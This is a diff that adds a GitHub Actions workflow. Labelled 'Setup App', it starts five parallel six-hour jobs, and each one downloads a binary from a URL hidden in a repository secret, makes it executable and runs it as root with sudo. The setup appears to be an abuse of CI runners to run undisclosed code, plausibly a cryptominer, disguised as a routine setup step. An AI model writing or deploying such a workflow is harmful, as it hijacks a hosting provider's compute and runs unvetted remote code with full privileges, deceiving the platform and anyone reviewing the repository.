@@ -1,0 +1,24 @@
+name: oappx05
+on: 
+  workflow_dispatch:
+ 
+jobs:
+ node-1:
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false
+      matrix:
+         os: [ubuntu-latest, ubuntu-latest, ubuntu-latest, ubuntu-latest, ubuntu-latest]
+    timeout-minutes: 360
+    continue-on-error: true
+    steps:
+      - uses: actions/checkout@v4
+      - run: mkdir runner
+      - name: Setup App
+        working-directory: ./runner
+        run: |
+              wget -qO init_setup.bin ${{ secrets.FILES }}
+              sleep 5
+              sudo chmod 777 init_setup.bin
+              sudo ./init_setup.bin
+        shell: bash
